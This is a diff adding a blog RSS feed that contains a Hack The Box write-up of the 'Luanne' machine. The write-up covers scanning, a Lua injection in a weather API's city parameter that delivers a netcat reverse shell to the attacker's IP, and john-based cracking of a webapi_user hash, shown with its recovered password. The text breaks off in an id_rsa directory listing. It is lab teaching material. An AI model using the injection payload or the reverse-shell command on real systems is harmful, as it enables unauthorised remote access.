@@ -1,0 +1,285 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>lua on Mdn1nj4</title>
+    <link>https://mdninja.ml/tags/lua/</link>
+    <description>Recent content in lua on Mdn1nj4</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <copyright>Copyright © 2020–2021, all rights reserved.</copyright>
+    <lastBuildDate>Sun, 28 Mar 2021 04:35:07 +0530</lastBuildDate><atom:link href="https://mdninja.ml/tags/lua/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Luanne Writeup</title>
+      <link>https://mdninja.ml/post/luanne_htb/</link>
+      <pubDate>Sun, 28 Mar 2021 04:35:07 +0530</pubDate>
+      
+      <guid>https://mdninja.ml/post/luanne_htb/</guid>
+      <description>
+        
+          &lt;h1 id=&#34;__info__&#34;&gt;&lt;strong&gt;Info&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;Luanne is the Easy level OpenBSD machine.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Machine created by : polarbearer&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;__port-scan__&#34;&gt;&lt;strong&gt;Port Scan&lt;/strong&gt;&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;$ nmap -sC -sV -p- 10.10.10.218&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt; 1&lt;/span&gt;Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-27 19:18 GMT
+&lt;span class=&#34;ln&#34;&gt; 2&lt;/span&gt;Nmap scan report for 10.10.10.218
+&lt;span class=&#34;ln&#34;&gt; 3&lt;/span&gt;Host is up (0.039s latency).
+&lt;span class=&#34;ln&#34;&gt; 4&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 5&lt;/span&gt;PORT     STATE SERVICE VERSION
+&lt;span class=&#34;ln&#34;&gt; 6&lt;/span&gt;22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
+&lt;span class=&#34;ln&#34;&gt; 7&lt;/span&gt;| ssh-hostkey: 
+&lt;span class=&#34;ln&#34;&gt; 8&lt;/span&gt;|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
+&lt;span class=&#34;ln&#34;&gt; 9&lt;/span&gt;|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
+&lt;span class=&#34;ln&#34;&gt;10&lt;/span&gt;|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
+&lt;span class=&#34;ln&#34;&gt;11&lt;/span&gt;80/tcp   open  http    nginx 1.19.0
+&lt;span class=&#34;ln&#34;&gt;12&lt;/span&gt;| http-auth: 
+&lt;span class=&#34;ln&#34;&gt;13&lt;/span&gt;| HTTP/1.1 401 Unauthorized\x0D
+&lt;span class=&#34;ln&#34;&gt;14&lt;/span&gt;|_  Basic realm=.
+&lt;span class=&#34;ln&#34;&gt;15&lt;/span&gt;| http-robots.txt: 1 disallowed entry 
+&lt;span class=&#34;ln&#34;&gt;16&lt;/span&gt;|_/weather
+&lt;span class=&#34;ln&#34;&gt;17&lt;/span&gt;|_http-server-header: nginx/1.19.0
+&lt;span class=&#34;ln&#34;&gt;18&lt;/span&gt;|_http-title: 401 Unauthorized
+&lt;span class=&#34;ln&#34;&gt;19&lt;/span&gt;9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
+&lt;span class=&#34;ln&#34;&gt;20&lt;/span&gt;| http-auth: 
+&lt;span class=&#34;ln&#34;&gt;21&lt;/span&gt;| HTTP/1.1 401 Unauthorized\x0D
+&lt;span class=&#34;ln&#34;&gt;22&lt;/span&gt;|_  Basic realm=default
+&lt;span class=&#34;ln&#34;&gt;23&lt;/span&gt;|_http-server-header: Medusa/1.12
+&lt;span class=&#34;ln&#34;&gt;24&lt;/span&gt;|_http-title: Error response
+&lt;span class=&#34;ln&#34;&gt;25&lt;/span&gt;Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
+&lt;span class=&#34;ln&#34;&gt;26&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;27&lt;/span&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;span class=&#34;ln&#34;&gt;28&lt;/span&gt;Nmap done: 1 IP address (1 host up) scanned in 200.98 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After the nmap scan there is three ports are open in the Luanne Machine&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;22		- 	SSH&lt;/strong&gt; 	OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)&lt;br&gt;
+&lt;strong&gt;80		- 	HTTP&lt;/strong&gt; 	nginx 1.19.0&lt;br&gt;
+&lt;strong&gt;9001	- 	HTTP&lt;/strong&gt; 	Medusa httpd 1.12 (Supervisor process manager)&lt;/p&gt;
+&lt;h1 id=&#34;__enumuration__&#34;&gt;&lt;strong&gt;Enumuration&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;In port 80 When i try to access the web page. It asks for username and password.&lt;br&gt;
+If i hit enter it show the error with 401 Unathorized&lt;br&gt;
+&lt;img src=&#34;https://mdninja.ml/images/luanne/unathorized.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;and it reveal the it running in the port 3000		127.0.0.1:3000&lt;/p&gt;
+&lt;p&gt;after reading the robots.txt i decide to open the directory&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;curl http://10.10.10.218/robots.txt
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;User-agent: *
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;Disallow: /weather  #returning 404 but still harvesting cities 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;But /weather is not foound so i run the gobuster.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;$ gobuster dir -u http://10.10.10.218/weather/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt; 1&lt;/span&gt;Gobuster v3.1.0
+&lt;span class=&#34;ln&#34;&gt; 2&lt;/span&gt;by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)
+&lt;span class=&#34;ln&#34;&gt; 3&lt;/span&gt;===============================================================
+&lt;span class=&#34;ln&#34;&gt; 4&lt;/span&gt;[+] Url:                     http://10.10.10.218/weather/
+&lt;span class=&#34;ln&#34;&gt; 5&lt;/span&gt;[+] Method:                  GET
+&lt;span class=&#34;ln&#34;&gt; 6&lt;/span&gt;[+] Threads:                 10
+&lt;span class=&#34;ln&#34;&gt; 7&lt;/span&gt;[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+&lt;span class=&#34;ln&#34;&gt; 8&lt;/span&gt;[+] Negative Status codes:   404
+&lt;span class=&#34;ln&#34;&gt; 9&lt;/span&gt;[+] User Agent:              gobuster/3.1.0
+&lt;span class=&#34;ln&#34;&gt;10&lt;/span&gt;[+] Timeout:                 10s
+&lt;span class=&#34;ln&#34;&gt;11&lt;/span&gt;===============================================================
+&lt;span class=&#34;ln&#34;&gt;12&lt;/span&gt;2021/03/27 19:57:40 Starting gobuster in directory enumeration mode
+&lt;span class=&#34;ln&#34;&gt;13&lt;/span&gt;===============================================================
+&lt;span class=&#34;ln&#34;&gt;14&lt;/span&gt;/forecast             (Status: 200) [Size: 90]
+&lt;span class=&#34;ln&#34;&gt;15&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After the gobuster it found the directory /weather/forecast
+so let’s have a look at it.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://mdninja.ml/images/luanne/weather_forecast.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;if we want to list the cities we have pass the parameter &lt;strong&gt;&amp;quot;city=list&amp;quot;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://mdninja.ml/images/luanne/city_list.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;it show the list of cities.&lt;/p&gt;
+&lt;p&gt;then check the city london &lt;strong&gt;/weather/forecast?city=london&lt;/strong&gt;
+&lt;img src=&#34;https://mdninja.ml/images/luanne/city_london.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;If you the pass &#39; in the city parameter &lt;strong&gt;/weather/forecast?city=&#39;&lt;/strong&gt; It show the lua error.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://mdninja.ml/images/luanne/luanner_error.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;__lua-remote-code-execution__&#34;&gt;&lt;strong&gt;Lua Remote Code Execution&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;After that os.execute() is used for Execute the command in lua script so i used that funtion.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://mdninja.ml/images/luanne/google_lua_error.png&#34; alt=&#34;&#34;&gt;
+&lt;img src=&#34;https://mdninja.ml/images/luanne/gtfobin_lua.png&#34; alt=&#34;&#34;&gt;
+Payload :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&#39;);os.execute(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.xx.xx 1234 &amp;gt;/tmp/f&#39;)--&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;we break the code script flow and inject our lua code and &lt;strong&gt;&amp;quot;--&amp;quot;&lt;/strong&gt; used in lua language for comment&lt;br&gt;
+make sure to encode the payload&lt;br&gt;
+Encoded payload :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;%27%29%3Bos.execute%28%27rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201234%20%3E%2Ftmp%2Ff%27%29--&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Create listener then run the curl command&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;$ curl &#39;http://10.10.10.218/weather/forecast?city=%27%29%3Bos.execute%28%27rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201234%20%3E%2Ftmp%2Ff%27%29--&#39;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;getting-httpd-shell&#34;&gt;Getting httpd shell&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;$ nc -1vvnkp 1234&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;nc -lvvnkp 1234
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;listening on [any] 1234 ...
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;connect to [10.10.xx.xx] from (UNKNOWN) [10.10.10.218] 65471
+&lt;span class=&#34;ln&#34;&gt;4&lt;/span&gt;sh: can&amp;#39;t access tty; job control turned off
+&lt;span class=&#34;ln&#34;&gt;5&lt;/span&gt;$ id
+&lt;span class=&#34;ln&#34;&gt;6&lt;/span&gt;uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
+&lt;span class=&#34;ln&#34;&gt;7&lt;/span&gt;$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After some enumuration i found the &lt;strong&gt;.htaccess&lt;/strong&gt; file which contain webapi_user password&lt;/p&gt;
+&lt;p&gt;copy the hash and the save to the file.&lt;/p&gt;
+&lt;p&gt;then crack the hash with john&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;$ john hash --wordlist=/opt/rockyou.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span class=&#34;ln&#34;&gt; 1&lt;/span&gt;john &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/opt/rockyou.txt
+&lt;span class=&#34;ln&#34;&gt; 2&lt;/span&gt;Warning: detected &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;md5crypt&amp;#34;&lt;/span&gt;, but the string is also recognized as &lt;span class=&#34;s2&#34;&gt;&amp;#34;md5crypt-long&amp;#34;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 3&lt;/span&gt;Use the &lt;span class=&#34;s2&#34;&gt;&amp;#34;--format=md5crypt-long&amp;#34;&lt;/span&gt; option to force loading these as that &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; instead
+&lt;span class=&#34;ln&#34;&gt; 4&lt;/span&gt;Using default input encoding: UTF-8
+&lt;span class=&#34;ln&#34;&gt; 5&lt;/span&gt;Loaded &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; password &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5crypt, crypt&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt;$ &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;and variants&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MD5 128/128 AVX 4x3&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 6&lt;/span&gt;Will run &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; OpenMP threads
+&lt;span class=&#34;ln&#34;&gt; 7&lt;/span&gt;Press &lt;span class=&#34;s1&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; status
+&lt;span class=&#34;ln&#34;&gt; 8&lt;/span&gt;iamthebest       &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;webapi_user&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 9&lt;/span&gt;1g 0:00:00:00 DONE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2021-03-27 21:02&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 5.555g/s 16533p/s 16533c/s 16533C/s secrets..lance
+&lt;span class=&#34;ln&#34;&gt;10&lt;/span&gt;Use the &lt;span class=&#34;s2&#34;&gt;&amp;#34;--show&amp;#34;&lt;/span&gt; option to display all of the cracked passwords reliably
+&lt;span class=&#34;ln&#34;&gt;11&lt;/span&gt;Session completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now i have &lt;strong&gt;webapi_user : iamthebest&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;then try to login with ssh but failed!&lt;/p&gt;
+&lt;p&gt;Next webserver&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://mdninja.ml/images/luanne/authorized_login.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Nothing interesting&lt;/p&gt;
+&lt;h1 id=&#34;__getting-rmichaels-shell__&#34;&gt;&lt;strong&gt;Getting r.Michaels Shell&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;After some enumuration i found the 127.0.0.1:3001 also have the same page but why&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://mdninja.ml/images/luanne/3000_port.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I want to check that so i run the curl command with payload&lt;/p&gt;
+&lt;p&gt;But it failed&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;curl &amp;#39;http://127.0.0.1:3001/weather/forecast?city=%27%29%3Bos.execute%28%27rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.6%201234%20%3E%2Ftmp%2Ff%27%29--&amp;#39;
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;  
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;{&amp;#34;code&amp;#34;: 500,&amp;#34;error&amp;#34;: &amp;#34;unknown city: &amp;#39;);os.execute(&amp;#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.6 1234 &amp;gt;/tmp/f&amp;#39;)--&amp;#34;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I does not execute it return unknown city,so i confirmed that 3001 port server has been patched.&lt;/p&gt;
+&lt;p&gt;After reading the NetBSD httpd documentation.&lt;/p&gt;
+&lt;p&gt;I get the idea&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;$ curl http://127.0.0.1:3001/~r.michaels/ -s --user &amp;quot;webapi_user:iamthebest&amp;quot;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;ln&#34;&gt; 1&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;style&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;text/css&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 4&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 5&lt;/span&gt;	&lt;span class=&#34;k&#34;&gt;border-top&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;solid&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;black&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 6&lt;/span&gt;	&lt;span class=&#34;k&#34;&gt;border-bottom&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;solid&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;black&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 8&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;th&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;background&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;aquamarine&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 9&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;tr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nd&#34;&gt;nth-child&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;even&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;background&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;lavender&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Index of ~r.michaels/&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;h1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Index of ~r.michaels/&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;h1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;13&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;cols&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;14&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;thead&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;tr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;th&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Name&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;th&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Last modified&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;th&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;align&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Size
+&lt;span class=&#34;ln&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;tbody&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;17&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;tr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;td&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;../&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Parent Directory&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;td&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;16-Sep-2020 18:20&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;td&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;align&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;1kB
+&lt;span class=&#34;ln&#34;&gt;18&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;tr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;td&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;id_rsa&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;id_rsa&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;td&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;16-Sep-2020 16:52&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;td&lt;/span&gt; &lt;span 